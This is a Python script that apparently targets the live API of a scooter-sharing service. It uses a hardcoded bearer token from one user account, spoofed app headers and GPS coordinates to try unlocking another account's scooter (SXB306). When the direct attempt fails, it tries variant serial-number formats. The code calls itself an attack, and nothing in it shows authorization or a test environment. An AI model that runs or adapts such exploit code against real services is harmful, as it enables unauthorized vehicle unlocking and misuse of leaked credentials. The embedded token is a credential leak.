#!/usr/bin/env python3
"""
Test Cross-Account Scooter Access
Using first account token to unlock SXB306 scooter
"""

import requests
import json
import time
from datetime import datetime

# Your first account token (user 103493)
FIRST_ACCOUNT_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI5MzY1MTQ5Yi1lZDdkLTQ1Y2MtYTZiMi1lYTU0NmMyOWE2NGUiLCJpYXQiOjE3NTk0NDQxMDcsImV4cCI6MTc1OTQ0NzcwN30.ge09yj7PfvFgPeJsQmmfcm74YuQaU-dAgxtW21q-LHY"

# API Configuration
BASE_URL = "https://api.knotcity.io"
UNLOCK_ENDPOINT = "/api/application/vehicles/unlock"
LOCK_ENDPOINT = "/api/application/vehicles/freefloat/lock"

# Headers
HEADERS = {
    "Authorization": FIRST_ACCOUNT_TOKEN,
    "Content-Type": "application/json",
    "User-Agent": "MaynDrive/1.1.34 (Android; Mobile)",
    "Accept": "application/json"
}

# Test scooter data
SXB306_SCOOTER = {
    "serial": "SXB306",
    "lat": 47.3903912328159,  # From your capture data
    "lng": 0.6889144890010357
}

def test_token_validity():
    """Test if the first account token is still valid"""
    print("🔍 Testing first account token validity...")
    
    try:
        response = requests.get(f"{BASE_URL}/api/application/vehicles", headers=HEADERS, timeout=10)
        print(f"   Status: {response.status_code}")
        if response.status_code in [200, 404]:
            print("✅ First account token is VALID!")
            return True
        else:
            print(f"❌ First account token invalid: {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ Error testing token: {e}")
        return False

def attack_sxb306_unlock():
    """Attempt to unlock SXB306 using first account token"""
    print(f"🔓 Attempting to unlock SXB306 using first account token...")
    print(f"   Scooter: {SXB306_SCOOTER['serial']}")
    print(f"   Location: {SXB306_SCOOTER['lat']}, {SXB306_SCOOTER['lng']}")
    print(f"   Token User: 103493 (first account)")
    
    payload = {
        "serial_number": SXB306_SCOOTER["serial"],
        "lat": SXB306_SCOOTER["lat"],
        "lng": SXB306_SCOOTER["lng"]
    }
    
    try:
        response = requests.post(f"{BASE_URL}{UNLOCK_ENDPOINT}", 
                               headers=HEADERS, 
                               json=payload, 
                               timeout=15)
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print("🚨 CRITICAL VULNERABILITY CONFIRMED!")
            print("🚨 First account can unlock SXB306 scooter!")
            print("🚨 This indicates CROSS-ACCOUNT SCOOTER ACCESS!")
            return True
        elif response.status_code == 403:
            print("✅ Good: Permission denied (proper access control)")
            print("✅ First account cannot access SXB306 scooter")
            return False
        elif response.status_code == 400:
            print("❌ Bad request - checking error details...")
            try:
                error_data = response.json()
                print(f"   Error: {error_data}")
            except:
                print(f"   Raw error: {response.text}")
            return False
        else:
            print(f"❌ Unexpected response: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"❌ Error during SXB306 unlock test: {e}")
        return False

def test_different_serial_formats():
    """Test different serial number formats for SXB306"""
    print("🧪 Testing different serial formats for SXB306...")
    
    test_serials = [
        "SXB306",      # Original format
        "sxb306",      # Lowercase
        "SXB306",      # Uppercase
        "306",         # Just the number
        "SXB",         # Just the prefix
    ]
    
    for serial in test_serials:
        print(f"\n--- Testing serial: {serial} ---")
        payload = {
            "serial_number": serial,
            "lat": SXB306_SCOOTER["lat"],
            "lng": SXB306_SCOOTER["lng"]
        }
        
        try:
            response = requests.post(f"{BASE_URL}{UNLOCK_ENDPOINT}", 
                                   headers=HEADERS, 
                                   json=payload, 
                                   timeout=15)
            
            print(f"   Status: {response.status_code}")
            if response.status_code == 200:
                print("🎉 SUCCESS! This serial format worked!")
                print(f"   Response: {response.text}")
                return True
            elif response.status_code == 403:
                print("   Permission denied (good - proper access control)")
            elif response.status_code == 400:
                print(f"   Bad request: {response.text[:100]}...")
            else:
                print(f"   Unexpected: {response.status_code}")
                
        except Exception as e:
            print(f"   Error: {e}")
        
        time.sleep(1)
    
    return False

def main():
    print("=" * 80)
    print("🚨 CROSS-ACCOUNT SCOOTER ACCESS TEST")
    print("=" * 80)
    print("⚠️  WARNING: Testing if first account can unlock SXB306!")
    print("=" * 80)
    print("Target: SXB306 scooter")
    print("Attacker: First account (user 103493)")
    print("Test: Cross-account scooter access vulnerability")
    print("=" * 80)
    
    # Test 1: Validate first account token
    print("\n1️⃣ FIRST ACCOUNT TOKEN VALIDATION")
    print("-" * 40)
    if not test_token_validity():
        print("❌ Cannot proceed - first account token is invalid")
        return
    
    # Test 2: Direct SXB306 unlock attempt
    print("\n2️⃣ DIRECT SXB306 UNLOCK TEST")
    print("-" * 40)
    success = attack_sxb306_unlock()
    
    # Test 3: Different serial formats
    if not success:
        print("\n3️⃣ DIFFERENT SERIAL FORMAT TEST")
        print("-" * 40)
        success = test_different_serial_formats()
    
    # Test 4: Security analysis
    print("\n4️⃣ SECURITY ANALYSIS")
    print("-" * 40)
    
    if success:
        print("🚨 CRITICAL VULNERABILITY CONFIRMED!")
        print("🚨 CROSS-ACCOUNT SCOOTER ACCESS IS POSSIBLE!")
        print("🚨 First account can unlock scooters from other accounts!")
        print("\n📊 Impact Assessment:")
        print("   - Severity: CRITICAL")
        print("   - Scope: Cross-account scooter access")
        print("   - Exploitability: High")
        print("   - Business Impact: Severe")
        print("   - Any user can unlock any scooter!")
    else:
        print("✅ GOOD: Cross-account access is properly blocked")
        print("✅ First account cannot access SXB306 scooter")
        print("\n📊 Security Assessment:")
        print("   - Severity: LOW (proper access control)")
        print("   - Scope: User-specific access only")
        print("   - Exploitability: Low")
        print("   - Business Impact: Minimal")
        print("   - Proper user isolation working")
    
    print("\n" + "=" * 80)
    print("🎯 TEST COMPLETE")
    print("=" * 80)

if __name__ == "__main__":
    main()
